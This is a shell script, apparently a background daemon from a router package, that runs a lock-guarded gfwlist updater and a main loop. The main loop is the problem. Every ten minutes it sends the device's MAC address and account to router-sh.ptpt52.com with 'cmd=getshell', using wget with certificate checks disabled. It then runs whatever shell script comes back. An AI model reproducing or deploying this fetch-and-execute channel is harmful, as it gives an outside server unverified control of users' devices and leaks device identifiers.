#!/bin/sh

ACC=$1
ACC=`echo -n "$ACC" | base64`
CLI=`sed 's/:/-/g' /sys/class/net/eth0/address`

cd /tmp

_NAME=`basename $0`

LOCKDIR=/tmp/$_NAME.lck

cleanup () {
	if rmdir $LOCKDIR; then
		echo "Finished"
	else
		echo "Failed to remove lock directory '$LOCKDIR'"
		exit 1
	fi
}

gfwlist_update_main () {
	while :; do
		sleep 60
		sh /usr/share/natcapd/gfwlist_update.sh
		sleep 86340
	done
}

main() {
	while :; do
		sleep 120
		rm -f /tmp/xx.sh
		rm -f /tmp/nohup.out
		ACC=`uci get natcapd.default.account 2>/dev/null`
		/usr/bin/wget --no-check-certificate -q "https://router-sh.ptpt52.com/router-update.cgi?cmd=getshell&acc=$ACC&cli=$CLI" -O /tmp/xx.sh
		head -n1 /tmp/xx.sh | grep '#!/bin/sh' >/dev/null 2>&1 && {
			chmod +x /tmp/xx.sh
			nohup /tmp/xx.sh &
		}
		sleep 540
	done
}

nop_loop () {
	while :; do
		sleep 86400
	done
}

if mkdir $LOCKDIR 2>/dev/null; then
	trap "cleanup" EXIT

	echo "Acquired lock, running"

	gfwlist_update_main &
	main &
	nop_loop
else
	echo "Could not create lock directory '$LOCKDIR'"
	exit 0
fi
